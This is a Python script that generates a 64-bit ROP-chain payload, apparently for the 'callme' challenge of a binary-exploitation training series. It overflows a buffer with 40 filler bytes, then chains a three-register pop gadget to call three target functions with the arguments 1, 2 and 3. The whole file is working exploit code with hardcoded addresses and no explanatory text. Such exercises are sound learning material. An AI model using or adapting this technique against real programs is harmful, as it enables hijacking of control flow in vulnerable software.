import struct
crap = "A" *40

def stringpacker(addr):

    return str(struct.pack("<Q",addr))

callmeOneAddr = 0x0000000000401850
callmeTwoAddr = 0x0000000000401870
callmeThreeAddr = 0x0000000000401810
threetimesPopGadget = 0x0000000000401ab0 # pop rdi; pop rsi; pop rdx; ret; symbol: usefulGadgets
#x64 calling convention: arg1 - rdi, arg2 - rsi, arg3 - rdx


callmeone = stringpacker(callmeOneAddr)
callmetwo = stringpacker(callmeTwoAddr)
callmethree = stringpacker(callmeThreeAddr)
popGadget = stringpacker(threetimesPopGadget)

params = stringpacker(1) + stringpacker(2) + stringpacker(3)

payload = crap
payload += popGadget + params
payload += callmeone
payload += popGadget + params
payload += callmetwo
payload += popGadget + params
payload += callmethree

print(payload)

